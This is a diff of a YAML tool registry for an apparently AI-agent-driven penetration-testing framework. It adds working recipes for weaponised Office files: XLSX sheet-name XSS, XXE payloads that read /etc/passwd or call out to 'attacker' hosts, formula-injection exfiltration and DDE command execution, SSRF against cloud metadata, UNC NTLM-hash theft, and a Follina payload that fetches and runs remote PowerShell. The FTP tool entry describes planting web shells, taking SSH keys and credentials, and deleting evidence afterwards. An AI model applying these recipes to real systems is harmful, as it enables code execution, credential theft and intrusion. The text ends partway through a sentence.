@@ -1,5 +1,5 @@
 version: '2.0'
-updated_at: '2026-05-17T15:37:16Z'
+updated_at: '2026-05-17T20:09:36Z'
 tools:
   amass:
     name: amass
@@ -5001,6 +5001,134 @@ tools:
       when: 'Find ROP gadgets in a target binary. ropper installed via pip in the image. {gadget_pattern} examples: ''pop
         rdi; ret'', ''pop rsi; pop r15; ret''. Output is the gadget address and instruction sequence. Build agent uses this
         when assembling ROP chains.'
+    - name: Generate malicious XLSX with sheet-name XSS (CVE-2025-22131 pattern)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Inject JavaScript into XLSX sheet names for XSS in web apps that render sheet names server-side without escaping\
+        \ (CVE-2025-22131 PHPSpreadsheet is canonical sink). Excel itself does NOT escape sheet names — consuming apps are\
+        \ expected to.\n\n**CRITICAL: the payload string must be XML-attribute-valid** — raw `<` `>` `&` `\"` inside an XML\
+        \ attribute break the XML parse and Excel reports \"file is corrupt\". Use HTML-entity-encoded angle brackets; the\
+        \ XML parser decodes them when the consuming app extracts the sheet name into PHP/Python/Java, and the consumer's\
+        \ unsafe HTML echo turns the decoded form into executable HTML in the rendered page.\n\nRecipe (write to /session/exploits/{name}.py):\n\
+        \n  import openpyxl, zipfile\n  openpyxl.Workbook().save(\"/tmp/c.xlsx\")          # clean baseline\n  # XML-attribute-valid\
+        \ payload (entity-encoded angle brackets):\n  PAYLOAD_XML = b'&lt;svg onload=alert(1)&gt;'\n  with zipfile.ZipFile(\"\
+        /tmp/c.xlsx\") as zin:\n    with zipfile.ZipFile(\"/session/output/x.xlsx\", \"w\") as zout:\n      for item in zin.namelist():\n\
+        \        data = zin.read(item)\n        if item == \"xl/workbook.xml\":\n          data = data.replace(b'name=\"Sheet\"\
+        ', b'name=\"' + PAYLOAD_XML + b'\"')\n        zout.writestr(item, data)\n  # Validate via openpyxl round-trip — confirms\
+        \ the XML is well-formed\n  # AND that the sheet name decodes to the dangerous form for the consumer:\n  wb = openpyxl.load_workbook(\"\
+        /session/output/x.xlsx\", read_only=True)\n  assert wb.sheetnames[0] == \"<svg onload=alert(1)>\"  # entity-decoded\
+        \ form\n\nThen upload to target and observe DOM at any UI that lists sheet names.\n"
+    - name: Inject XXE into XLSX (workbook.xml target — always present)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Excel parses several XML files in XLSX for XXE. Always-present targets: xl/workbook.xml, xl/worksheets/sheet1.xml,\
+        \ xl/styles.xml, [Content_Types].xml. **xl/sharedStrings.xml is conditional — openpyxl optimizes inline strings into\
+        \ sheet1.xml and may NOT create sharedStrings.xml at all.** When uncertain, target xl/workbook.xml (always present).\
+        \ Files under xl/theme/, xl/charts/, xl/drawings/ are NOT typically parsed and DOCTYPE injection there is silently\
+        \ ignored.\n\nOOB XXE (HTTP callback exfil) payload:\n  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker/log\"\
+        > %xxe;]>\n\nFile-read XXE:\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n\nRecipe (xl/workbook.xml\
+        \ target):\n\n  import openpyxl, zipfile, re\n  openpyxl.Workbook().save(\"/tmp/c.xlsx\")\n  XXE = b'<!DOCTYPE foo\
+        \ [<!ENTITY % xxe SYSTEM \"http://attacker/log\"> %xxe;]>'\n  with zipfile.ZipFile(\"/tmp/c.xlsx\") as zin:\n    with\
+        \ zipfile.ZipFile(\"/session/output/x.xlsx\", \"w\") as zout:\n      for item in zin.namelist():\n        data = zin.read(item)\n\
+        \        if item == \"xl/workbook.xml\":\n          data = re.sub(rb'<\\?xml[^?]*\\?>\\s*', b'', data, flags=re.IGNORECASE)\n\
+        \          data = XXE + b'\\n' + data\n        zout.writestr(item, data)\n\n**Validation for XXE files is different**\
+        \ — openpyxl REFUSES to load XXE-laden files by design (defends against external entity resolution). Don't round-trip;\
+        \ instead verify `zipfile.testzip()` returns None and the XXE bytes are at the expected XML path. See \"VALIDATE OUTPUT\
+        \ OPENS\" gotcha.\n"
+    - name: XLSX formula injection (HYPERLINK exfil + DDE command exec)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Excel formula engine executes =FUNCTIONS in cells. Useful sinks:\n\n- =HYPERLINK(\"http://attacker/track?d=\"\
+        &A1, \"Click me\") — exfils cell A1 on user click\n- =CMD|'calc'!A0 — DDE command exec (LEGACY; Microsoft disabled\
+        \ DDE by default 2017; still works on misconfigured installs)\n- =WEBSERVICE(\"http://attacker/log?d=\"&A1) — auto-exfil\
+        \ on open (newer Excel blocks; works in compat mode)\n\nRecipe: openpyxl supports setting cell formulas directly:\n\
+        \  wb = openpyxl.Workbook()\n  wb.active['A1'] = '=HYPERLINK(\"http://attacker/log\", \"Click\")'\n  wb.save(\"/session/output/x.xlsx\"\
+        )\n\nopenpyxl writes the formula as <f> element in xl/worksheets/sheet1.xml. NO post-processing needed for basic formula\
+        \ injection.\n"
+    - name: XLSX external workbook reference (SSRF via externalLink)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: 'XLSX supports referencing external workbooks via xl/externalLinks/. When opened, Excel fetches the external resource
+        — SSRF vector. Useful for AWS IMDS (http://169.254.169.254/), internal services, OOB exfil.
+
+
+        Recipe: generate clean xlsx with openpyxl, post-process to ADD: (1) xl/externalLinks/externalLink1.xml, (2) xl/externalLinks/_rels/externalLink1.xml.rels
+        with malicious Target URL + TargetMode="External", (3) update [Content_Types].xml to declare the new Override, (4)
+        update xl/_rels/workbook.xml.rels with new externalLink relationship. ~30 LOC. The relationship Type is "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink".
+
+        '
+    - name: Inject XXE into DOCX (document.xml target)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Word parses word/document.xml as XML — inject DOCTYPE for XXE. Other parseable XML targets in DOCX: word/settings.xml,\
+        \ word/styles.xml, word/fontTable.xml, word/webSettings.xml. Same DOCTYPE payloads as XLSX XXE.\n\nRecipe:\n  import\
+        \ docx, zipfile\n  docx.Document().save(\"/tmp/c.docx\")\n  # then same zipfile post-process pattern as XLSX XXE,\
+        \ targeting word/document.xml\n\nLibrary name is `docx` (from python-docx package), NOT `python_docx`.\n"
+    - name: DOCX external image reference (SSRF + UNC NTLM-hash leak)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: 'Word fetches external image references on open — SSRF vector. For Windows targets, UNC paths (\\attacker\share\img.png
+        — TWO backslashes at start, single between) trigger automatic NTLM authentication, leaking the NetNTLMv2 hash to attacker''s
+        responder/ntlmrelayx listener (see tools/responder).
+
+
+        Recipe: add a relationship in word/_rels/document.xml.rels with Type="...image", TargetMode="External", Target="http://attacker/"
+        (HTTP SSRF) or "\\attacker\share\img.png" (UNC NTLM-leak), then insert a <w:drawing> element in word/document.xml
+        referencing the relationship via <a:blip r:link="rIdN"/>.
+
+
+        **CRITICAL: UNC paths in Python string literals need backslash-escaping** (`"\\\\attacker\\share\\img.png"` in a Python
+        string yields the real UNC path `\\attacker\share\img.png`). And for placement in an XML attribute, use `xml.sax.saxutils.quoteattr()`
+        to handle inner quoting correctly.
+
+
+        For the UNC NTLM-theft case specifically, consider wrapping `ntlm_theft` (github.com/Greenwolf/ntlm_theft) — actively
+        maintained, GPL-3.0, Kali-packaged, generates 15+ file types beyond docx with the same SMB-UNC primitive.
+
+        '
+    - name: DOCX Follina template injection (CVE-2022-30190 ms-msdt)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Word's attachedTemplate feature fetches remote templates on open. If the template URL uses the ms-msdt: protocol\
+        \ handler, Windows hands it to MSDT (Microsoft Support Diagnostic Tool), which executes PowerShell. RCE on document\
+        \ open (no macro warning). Patched June 2022 in KB5014697; still works on unpatched Win10/Win11.\n\nThe ms-msdt URL\
+        \ template:\n  ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebsupFakeRecov=false;IT_LaunchMethod=ContextMenu;IT_BrowseForFile=/../../$(IEX($(curl\
+        \ http://attacker/payload.ps1)))i]]\"\n\n**CRITICAL: the URL contains literal double quotes** (`\"IT_RebsupFakeRecov=...`)\
+        \ that MUST be XML-attribute-escaped before placing in the Target attribute, OR the XML parser will choke. Use `xml.sax.saxutils.quoteattr()`\
+        \ which handles inner quoting correctly:\n\n  from xml.sax.saxutils import quoteattr\n  MSDT_URL = 'ms-msdt:/id PCWDiagnostic\
+        \ /skip force /param \"IT_RebsupFakeRecov=false;IT_LaunchMethod=ContextMenu;IT_BrowseForFile=/../../$(IEX($(curl http://attacker/p.ps1)))i]]\"\
+        '\n  TARGET_ATTR = quoteattr(MSDT_URL)        # returns quoted+escaped string\n  SETTINGS_RELS = f'''<?xml version=\"\
+        1.0\" encoding=\"UTF-8\"?>\n  <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"\
+        >\n    <Relationship Id=\"rId100\"\n      Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\
+        \n      Target={TARGET_ATTR} TargetMode=\"External\"/>\n  </Relationships>'''\n\nPlus add `<w:attachedTemplate xmlns:r=\"\
+        ...\" r:id=\"rId100\"/>` inside `<w:settings>...</w:settings>` in word/settings.xml.\n\nReference PoC for the full\
+        \ recipe: github.com/chvancooten/follina.py.\n\nWARNING — the retired office-exploit tool had a dead-code branch that\
+        \ constructed the ms-msdt URL then discarded it (the actual relationship target ended up as the plain HTTP URL, not\
+        \ the ms-msdt URL). Verify your output: `zipfile.ZipFile(out).read('word/_rels/settings.xml.rels')` must contain the\
+        \ literal string \"ms-msdt:\" — if it doesn't, your Follina payload won't trigger.\n"
+    - name: Inject XXE into PPTX (presentation.xml target)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "PowerPoint parses ppt/presentation.xml as XML — inject DOCTYPE for XXE. Other parseable XML targets in PPTX:\
+        \ ppt/slides/slide1.xml (per slide), ppt/slideLayouts/slideLayout1.xml, ppt/slideMasters/slideMaster1.xml. Same DOCTYPE\
+        \ payloads as XLSX/DOCX XXE.\n\nRecipe:\n  import pptx, zipfile\n  pptx.Presentation().save(\"/tmp/c.pptx\")\n  #\
+        \ then same zipfile post-process pattern, targeting ppt/presentation.xml\n\nLibrary name is `pptx` (from python-pptx\
+        \ package).\n"
+    - name: PPTX action link (hover/click hyperlink to attacker URL)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "PPTX supports hover-action and click-action on slide objects (text boxes, shapes). Action can launch a URL (hyperlink\
+        \ — opens browser) OR a program path (ppaction://program — Windows tries to execute with a consent dialog). Useful\
+        \ for phishing landing pages (hover) or assisted exec (click).\n\n**CRITICAL: target the SHAPE's cNvPr, NOT the group's\
+        \ cNvPr.** python-pptx generates multiple `<p:cNvPr>` elements per slide:\n  - `<p:cNvPr id=\"1\" name=\"\"/>` — the\
+        \ slide's GROUP container (a structural wrapper)\n  - `<p:cNvPr id=\"2\" name=\"TextBox 1\"/>` — the actual TextBox\
+        \ shape\n  - `<p:cNvPr id=\"3\" name=\"...\"/>` — additional shapes (if any)\n\nAction links injected into the group\
+        \ cNvPr (id=\"1\") will NOT fire — they need to be on a real shape. Find `id=\"2\"` (or higher) and add the hlinkClick\
+        \ there.\n\nRecipe: generate clean pptx with python-pptx + add a textbox shape (so id=\"2\" exists), post-process\
+        \ to (1) add `<a:hlinkHover>` or `<a:hlinkClick>` child to the shape's `<p:cNvPr id=\"2\"...>` element in ppt/slides/slide1.xml\
+        \ (convert the self-closing `/>` to `>...<a:hlinkClick.../></p:cNvPr>`), (2) add the matching hyperlink relationship\
+        \ in ppt/slides/_rels/slide1.xml.rels with Target=<attacker URL>. Relationship Type is \"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\"\
+        . For program-launch variant, the action attribute on the hlinkClick element is `action=\"ppaction://program\"`.\n"
     params:
       python3:
       - 'Run a script: `python3 /session/exploits/{name}.py [args...]`'
@@ -5084,6 +5212,39 @@ tools:
       0 recipe writes across 17 engagements. The recipe abstraction was retired uniformly across kind:cli framework tools
       (impacket, certipy, kerbrute, netexec) when those migrated. exploit-runner follows the same pattern — for ad-hoc binary
       wrapping, write a /session/exploits/wrapper.sh shell script.'
+    - 'WHICH OOXML FILES OFFICE PARSES FOR XXE: not every XML file in an OOXML zip is actually parsed. For XLSX, the parseable
+      XXE targets are xl/workbook.xml, xl/sharedStrings.xml, xl/worksheets/sheet1.xml, xl/styles.xml, and [Content_Types].xml.
+      Files under xl/theme/, xl/charts/, xl/drawings/ are NOT typically parsed and DOCTYPE injection there is silently ignored
+      — your payload won''t trigger. For DOCX: word/document.xml, word/settings.xml, word/styles.xml, word/fontTable.xml,
+      word/webSettings.xml. For PPTX: ppt/presentation.xml, ppt/slides/slide1.xml (per slide), ppt/slideLayouts/*, ppt/slideMasters/*.
+      If XXE doesn''t fire, you''re injecting into a file Office doesn''t read.'
+    - 'OOXML NAMESPACE URIs (exact strings required for valid scaffolding — get them wrong and Office shows ''file is corrupt''):
+      spreadsheetml main = http://schemas.openxmlformats.org/spreadsheetml/2006/main ; wordprocessingml main = http://schemas.openxmlformats.org/wordprocessingml/2006/main
+      ; presentationml main = http://schemas.openxmlformats.org/presentationml/2006/main ; officeDocument relationships =
+      http://schemas.openxmlformats.org/officeDocument/2006/relationships ; package relationships = http://schemas.openxmlformats.org/package/2006/relationships
+      ; package content-types = http://schemas.openxmlformats.org/package/2006/content-types ; drawingml main = http://schemas.openxmlformats.org/drawingml/2006/main.'
+    - 'XML ESCAPING — Office does NOT auto-escape user content in sheet names (XLSX), cell text values (xl/worksheets/sheet1.xml''s
+      <t> elements), document body text (word/document.xml''s <w:t>), or slide text. That''s the POINT — consuming apps are
+      expected to escape. Your payload string with `<script>`, `&`, `"` goes in RAW. BUT: malformed XML breaks the entire
+      document — if your payload''s unescaped quote or angle bracket gets parsed as XML structure, Office says ''file is corrupt''.
+      To verify: `openpyxl.load_workbook(path)` for XLSX / `docx.Document(path)` for DOCX / `pptx.Presentation(path)` for
+      PPTX — if the legitimate library raises, your payload broke the XML and you need to encode it differently (e.g., use
+      HTML entity references for the angle brackets the inner consumer will decode).'
+    - 'VALIDATE OUTPUT OPENS — round-trip the generated file with the legitimate library before delivering to target. `openpyxl.load_workbook(path,
+      read_only=True)` for XLSX. `docx.Document(path)` for DOCX. `pptx.Presentation(path)` for PPTX. If the library can re-read
+      it without exception, the file is well-formed enough for Office to open it. If it raises, fix the XML before sending.
+      Much cheaper than discovering on the engagement that the payload silently failed because the target couldn''t open the
+      file. **EXCEPTION — XXE payloads**: openpyxl/python-docx/python-pptx all REFUSE to load XXE-laden files BY DESIGN (they
+      defend against external entity resolution). For XXE-injected files, don''t round-trip; instead verify (a) `zipfile.ZipFile(path).testzip()
+      is None` (zip is valid), and (b) the XXE bytes are present at the expected XML path via `zipfile.ZipFile(path).read(''<target.xml>'')`.
+      Same applies to malformed-XML-by-design payloads. Round-trip validation is for XSS/formula/SSRF/Follina/action-link
+      payloads where the legitimate library should still accept the output.'
+    - 'FOLLINA (CVE-2022-30190) STATUS — patched by Microsoft June 2022 in KB5014697. Still works on unpatched Win10/Win11
+      (substantial install base remains, especially in OT/embedded contexts). EDR detection is mature now. The ms-msdt URL
+      MUST be the Target attribute of the attachedTemplate relationship in word/_rels/settings.xml.rels — NOT in word/settings.xml''s
+      body content. The retired office-exploit had a dead-code branch that constructed the ms-msdt URL but then assigned it
+      to a variable that was never written; verify output via `zipfile.ZipFile(out).read(''word/_rels/settings.xml.rels'')`
+      and grep for the literal ''ms-msdt:'' before sending. Reference PoC for the exact URL escaping: github.com/chvancooten/follina.py.'
     failure_signatures:
     - signal: SyntaxError
       remediation: 'Python syntax error in the script. Use the Read tool to inspect /session/exploits/<name>.py, find the
@@ -6209,16 +6370,19 @@ tools:
       purpose: 'exiftool flag reference. NB: exiftool''s flags are CASE-SENSITIVE; -j ≠ -J.'
   ftp:
     name: ftp
-    version: '1.0'
-    description: 'FTP/FTPS client (Python ftplib) for connecting to FTP servers, listing directories, downloading files, uploading
-      content, and deleting files. 5 methods: connect (test connection + root listing), list (directory contents with parsed
-      permissions/sizes), download (file as base64 + text), upload (text or base64 content), delete. Defaults to anonymous
-      login (username=''anonymous'', password=''anonymous@''). Supports FTPS (FTP over SSL/TLS) with auto-disabled certificate
-      verification. Downloads return both base64 (for binary) and text (for readable files, capped at 50KB). Uploads support
-      plain text or base64-encoded binary content.'
+    kind: cli
+    binary: curl
+    version: 8.14.1
+    description: 'FTP/FTPS client via /usr/bin/curl for post-discovery enumeration + file transfer on FTP servers. Stateless
+      per-call: open connection → command → close. Common engagement use: anonymous FTP read on port 21, writable directories
+      for web-shell drop (especially IIS aspx shells), config file / SSH-key / DB-backup retrieval. Migrated kind:mcp → kind:cli
+      May 2026 (daemon-wrapper retirement series, Tier A; 564-LOC Python ftplib wrapper collapsed to 22-LOC RunCliServer stub).
+      For FTP brute-force use hydra; for HTTP file transfers use curl directly with http(s):// URLs.'
     image: ghcr.io/silicon-works/mcp-tools-ftp:latest
-    image_size_mb: 100
-    timeout_seconds: 120
+    image_size_mb: 188
+    idle_timeout_seconds: 300
+    max_runtime_seconds: 600
+    timeout_seconds: 600
     capabilities:
     - ftp_connection
     - file_transfer
@@ -6236,15 +6400,18 @@ tools:
     routing:
       use_for:
       - connect to FTP server and list directory contents
-      - download files from FTP server
+      - download files from FTP server (config files, SSH keys, DB backups, CTF flags)
       - upload web shells or exploits to writable FTP share
       - check anonymous FTP access on port 21
       - enumerate files on FTP server after nmap finds port 21
-      - transfer files via FTPS encrypted connection
+      - transfer files via FTPS (FTP over TLS)
+      - delete uploaded artifacts after exploitation (operational cleanup)
+      - iterate over FTP directories looking for credential / config files
       never_use_for:
-      - FTP brute-force (use hydra)
+      - FTP brute-force (use hydra ftp://host)
       - port scanning
-      - HTTP file download (use curl)
+      - HTTP file download (use curl directly with http(s):// URLs)
+      - SMB share access (use smbclient or impacket)
       triggers:
       - FTP
       - FTPS
@@ -6252,235 +6419,233 @@ tools:
       - FTP upload
       - FTP download
       - port 21
-      prefer_over:
-      - curl
-    methods:
-      connect:
-        description: Test FTP connection, authenticate, and list the root directory contents. Returns the server welcome banner
-          (often reveals software version like 'vsFTPd 3.0.3'), current working directory, and up to 50 file listing entries.
-          Defaults to anonymous login.
-        when_to_use: The first step after nmap discovers FTP on port 21. Try anonymous access first (default credentials)
-          — many FTP servers allow anonymous read access. The welcome banner often reveals the FTP software and version (vsFTPd,
-          ProFTPD, Pure-FTPd, FileZilla Server) — check searchsploit for exploits. If anonymous login fails with 'permission
-          denied', try with discovered credentials. After successful connect, use list to explore subdirectories and download
-          to retrieve interesting files.
-        params:
-          host:
-            type: string
-            required: true
-            description: FTP server hostname or IP address.
-          port:
-            type: integer
-            default: 21
-            description: FTP port. Standard is 21.
-          username:
-            type: string
-            default: anonymous
-            description: FTP username. Default 'anonymous' for anonymous access. Use discovered credentials for authenticated
-              access.
-          password:
-            type: string
-            default: anonymous@
-            description: FTP password. Default 'anonymous@' for anonymous access.
-          ssl:
-            type: boolean
-            default: false
-            description: Use FTPS (FTP over TLS). Certificate verification is disabled for pentest use.
-          timeout:
-            type: integer
-            default: 30
-            description: Connection timeout in seconds.
-        returns:
-          welcome:
-            type: string
-            description: Server welcome banner (often contains software name and version).
-          listing:
-            type: array
-            description: Root directory listing (raw LIST output, up to 50 entries).
-      list:
-        description: List contents of a specific directory on the FTP server. Returns both parsed file data (permissions,
-          size, name, is_dir flag) and raw LIST output. Also returns simple filenames via NLST. Changes to the specified directory
-          before listing.
-        when_to_use: 'To explore subdirectories after initial connect. Look for: (1) Configuration files — .conf, .ini, .xml,
-          .env, (2) Backup files — .bak, .old, .zip, .tar.gz, (3) Web application files — .php, .html, .asp, (4) Credential
-          files — .htpasswd, id_rsa, (5) Directories with write permissions (starts with ''drwxrwxrwx''). After finding interesting
-          files, use download to retrieve them.'
-        params:
-          host:
-            type: string
-            required: true
-            description: FTP server hostname or IP address.
-          path:
-            type: string
-            default: /
-            description: Directory path to list (e.g., '/pub', '/upload', '/home/user').
-          port:
-            type: integer
-            default: 21
-            description: FTP port.
-          username:
-            type: string
-            default: anonymous
-            description: FTP username.
-          password:
-            type: string
-            default: anonymous@
-            description: FTP password.
-          ssl:
-            type: boolean
-            default: false
-            description: Use FTPS.
-          timeout:
-            type: integer
-            default: 30
-            description: Connection timeout in seconds.
-        returns:
-          files:
-            type: array
-            description: 'Parsed files, each with: permissions (e.g., ''drwxr-xr-x''), size, name, is_dir (boolean).'
-          raw_listing:
-            type: array
-            description: Raw FTP LIST output lines.
-      download:
-        description: Download a file from the FTP server via RETR binary transfer. Returns file content as both base64 (always)
-          and plain text (if UTF-8 decodable, capped at 50KB). The entire file is loaded into memory — suitable for config
-          files, scripts, and small binaries, not for multi-GB files.
-        when_to_use: 'To retrieve files discovered via connect or list. Common targets: (1) Configuration files with credentials
-          — wp-config.php, .env, web.config, (2) SSH private keys — id_rsa, (3) Database files — .sqlite, .db, (4) Backup
-          archives — .zip, .tar.gz (check size first), (5) CTF flags — user.txt, root.txt. The content_text field is useful
-          for text files; use content_base64 for binary files that need further processing.'
-        params:
-          host:
-            type: string
-            required: true
-            description: FTP server hostname or IP address.
-          remote_path:
-            type: string
-            required: true
-            description: Full path to the file on the FTP server (e.g., '/pub/backup.zip', '/home/user/.ssh/id_rsa').
-          port:
-            type: integer
-            default: 21
-            description: FTP port.
-          username:
-            type: string
-            default: anonymous
-            description: FTP username.
-          password:
-            type: string
-            default: anonymous@
-            description: FTP password.
-          ssl:
-            type: boolean
-            default: false
-            description: Use FTPS.
-          timeout:
-            type: integer
-            default: 60
-            description: Transfer timeout in seconds.
-        returns:
-          filename:
-            type: string
-            description: Extracted filename from the path.
-          size_bytes:
-            type: integer
-            description: Downloaded file size in bytes.
-          content_base64:
-            type: string
-            description: File content as base64 string (always present).
-          content_text:
-            type: string
-            description: File content as text (only if UTF-8 decodable, capped at 50KB). null for binary files.
-      upload:
-        description: Upload a file to the FTP server via STOR binary transfer. Content can be plain text (default) or base64-encoded
-          binary. Writes to a local temp file, uploads via STORBINARY, then cleans up. Requires write permission on the FTP
-          server — anonymous upload is rarely allowed.
-        when_to_use: 'When the FTP server has a writable directory (often overlapping with a web server''s document root).
-          Common uses: (1) Upload a PHP web shell to a writable /var/www/html via FTP, then trigger via HTTP, (2) Upload exploit
-          scripts or tools to the target, (3) Plant backdoor files in shared directories. Check list output for writable directories
-          first (look for ''drwxrwxrwx'' permissions or try uploading a test file). Requires authenticated credentials — anonymous
-          upload is rare.'
-        params:
-          host:
-            type: string
-            required: true
-            description: FTP server hostname or IP address.
-          remote_path:
-            type: string
-            required: true
-            description: Destination path on the FTP server (e.g., '/upload/shell.php', '/var/www/html/cmd.php').
-          content:
-            type: string
-            required: true
-            description: File content as plain text (default) or base64-encoded binary (set is_base64=true).
-          is_base64:
-            type: boolean
-            default: false
-            description: Set true if content is base64-encoded (for binary file uploads).
-          port:
-            type: integer
-            default: 21
-            description: FTP port.
-          username:
-            type: string
-            required: true
-            description: FTP username (required — anonymous upload is rarely allowed).
-          password:
-            type: string
-            required: true
-            description: FTP password.
-          ssl:
-            type: boolean
-            default: false
-            description: Use FTPS.
-          timeout:
-            type: integer
-            default: 60
-            description: Transfer timeout in seconds.
-        returns:
-          uploaded:
-            type: boolean
-            description: Whether upload succeeded.
-          size_bytes:
-            type: integer
-            description: Uploaded file size in bytes.
-      delete:
-        description: Delete a file from the FTP server via DELE command. Requires write/delete permissions on the server.
-        when_to_use: To clean up uploaded web shells, exploit files, or other artifacts after exploitation is complete. Good
-          operational security practice to remove evidence.
-        params:
-          host:
-            type: string
-            required: true
-            description: FTP server hostname or IP address.
-          remote_path:
-            type: string
-            required: true
-            description: Path to the file to delete on the FTP server.
-          port:
-            type: integer
-            default: 21
-            description: FTP port.
-          username:
-            type: string
-            required: true
-            description: FTP username (must have delete permissions).
-          password:
-            type: string
-            required: true
-            description: FTP password.
-          ssl:
-            type: boolean
-            default: false
-            description: Use FTPS.
-          timeout:
-            type: integer
-            default: 30
-            description: Connection timeout in seconds.
-        returns:
-          deleted:
-            type: boolean
-            description: Whether deletion succeeded.
+      - vsftpd
+      - ProFTPD
+      - Pure-FTPd
+      - FileZilla Server
+      prefer_over: []
+    see_also:
+    - tool: nmap
+      reason: Run `nmap -sV -p 21 <host>` before connecting — reveals FTP software + version (vsftpd 3.0.3, ProFTPD 1.3.5,
+        Pure-FTPd, FileZilla Server). Some versions have known CVEs (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306).
+        searchsploit follow-up if version is interesting.
+    - tool: hydra
+      reason: Use `hydra ftp://host` for credential brute-force or password spraying when anonymous access fails. Once hydra
+        returns a working pair, hand them to this `ftp` tool's authenticated patterns (-u user:pass).
+    - tool: searchsploit
+      reason: After nmap reveals FTP software + version, search for known FTP-software CVEs (vsftpd 2.3.4 backdoor at port
+        6200, ProFTPD mod_copy site-cp file write, vsftpd 3.0.3 STARTTLS bypass).
+    - tool: curl
+      reason: curl IS the underlying binary this tool wraps. For complex curl operations beyond FTP (HTTP, gopher, IMAP, etc.)
+        use curl tool directly; for FTP-specific use cases the routing/use_for triggers here are clearer.
+    - tool: nc
+      reason: Use `nc <host> 21` for a raw banner grab when FTP-protocol-level commands aren't needed — e.g., just confirming
+        what software is listening. Faster than full FTP handshake, but limited to what shows up in the 220 greeting.
+    - tool: sqlite
+      reason: 'After downloading a `.db` / `.sqlite` file via Pattern F3 (which lands at /session/output/ftp/<filename>),
+        pipe into the `sqlite` (kind:cli v3.46) tool for extraction: Pattern S1 list_tables → S2 describe_table → S6 find-credentials
+        chain.'
+    target_extraction:
+    - rule: positional_match
+      pattern: ftps?://(?:[^/@\s]+@)?([^/:?#\s]+)
+      group: 1
+      parse_as: raw
+    target_extraction_reason: 'curl''s positional URL arg encodes the FTP host. Regex matches ftp:// or ftps:// scheme, optionally
+      skips a user:pass@ prefix, and captures the hostname up to the next /, :, ?, #, or whitespace. Schema matches the canonical
+      shape used by `ssh` and `nc` tools (rule + pattern + group + parse_as).'
+    reject_flags: []
+    reject_flags_reason: curl has no remote-target argument shape other than the URL itself; reject_flags wouldn't apply usefully.
+    usage_patterns:
+    - name: Pattern F0 — anonymous-quickcheck (no -u, curl's default auth)
+      binary: curl
+      command: -sS --max-time 10 ftp://<host>:<port>/
+      when: First probe of any newly-discovered port 21. `curl ftp://host/` without -u flag uses RFC-1738 default anonymous
+        auth (username=anonymous, password=ftp@example.com). Returns the root directory listing if anonymous is allowed, or
+        530 if not. This is the FASTEST way to check anonymous access — single call, no manual credential supply. Add `-v`
+        for the welcome banner (220 line — often reveals software + version).
+    - name: Pattern F1 — connect with explicit creds + verbose banner extraction
+      binary: bash
+      command: -c "curl -sSv --max-time 10 -u <user>:<pass> ftp://<host>:<port>/ 2>&1 | grep -E '^< 220|^< 230|^< 331|^< 530'"
+      when: 'Authenticated connection probe. `-v` writes the FTP protocol exchange to stderr; grep filters for response codes:
+        220 (welcome banner with software/version), 230 (login OK), 331 (need password), 530 (auth failed). MUST wrap in `bash
+        -c ''...''` because curl alone cannot interpret the `2>&1 | grep` shell redirect+pipe. For just the welcome banner
+        without auth: same pattern with no -u flag. Verified live 2026-05-17 against HTB Devel via MCPTestClient: `< 220 Microsoft
+        FTP Service`, `< 230 User logged in.`'
+    - name: Pattern F2 — list specific directory
+      binary: curl
+      command: -sS --max-time 15 -u <user>:<pass> ftp://<host>:<port>/<path>/
+      when: 'Enumerate contents of a specific directory after F0 / F1 confirmed access. The trailing slash on the URL is REQUIRED
+        — without it curl treats the URL as a file to RETR (download) instead of a dir to LIST. For anonymous, omit `-u`.
+        Look for: config files (.conf, .ini, .env, .xml), backups (.bak, .old, .zip, .tar.gz), web-app files (.php, .html,
+        .aspx), credential stores (.htpasswd, id_rsa, .ssh/, *.sqlite, *.db), and writable directories (drwxrwxrwx perms).'
+    - name: Pattern F3 — download file → save to session + optional base64
+      binary: bash
+      command: -c 'mkdir -p /session/output/ftp && curl -sS --max-time 60 -u <user>:<pass> ftp://<host>:<port>/<remote_path>
+        -o /session/output/ftp/<local_name> && echo "size=$(stat -c%s /session/output/ftp/<local_name>) base64=$(base64 -w0
+        /session/output/ftp/<local_name> | head -c 100)..."'
+      when: 'Download a file to session storage. For TEXT files agent can `cat /session/output/ftp/<local_name>` after the
+        download to read contents inline. For BINARY files use base64 (full output: `base64 -w0 /session/output/ftp/<local_name>`).
+        The trailing `head -c 100` in the recipe is just a preview marker; full base64 if needed via separate spawn. For very
+        large files (multi-MB+), the download proceeds streaming-to-disk — only the file path is returned, not the bytes.'
+    - name: Pattern F4 — upload file via -T (authenticated; anonymous upload is rare)
+      binary: bash
+      command: -c 'mkdir -p /session/output/ftp && echo -n "<content>" > /session/output/ftp/<local_name> && curl -sS --max-time
+        60 -u <user>:<pass> -T /session/output/ftp/<local_name> ftp://<host>:<port>/<remote_dir>/'
+      when: 'Upload a file. Two-step: (1) Write content to /session/output/ftp/<local_name> via `echo > file` or via the Write
+        tool for multi-line content (PHP web shells, ASPX payloads, exploit scripts), then (2) `curl -T` uploads it. The trailing
+        slash on the remote URL is REQUIRED — keeps the local filename; without it curl interprets the URL as the full remote
+        name. For BINARY uploads (compiled exploits), use `printf ''<base64>'' | base64 -d > /session/output/ftp/payload.bin`
+        first. Common targets: writable web-server doc-root (/var/www/html for nginx/apache, C:\inetpub\wwwroot\ for IIS —
+        drop a webshell there and trigger via HTTP).'
+    - name: Pattern F5 — delete via --quote 'DELE path'
+      binary: curl
+      command: -sS --max-time 10 -u <user>:<pass> --quote "DELE <path>" ftp://<host>:<port>/
+      when: 'Delete a file post-exploitation (operational cleanup of uploaded webshell / exploit). The `--quote` flag is the
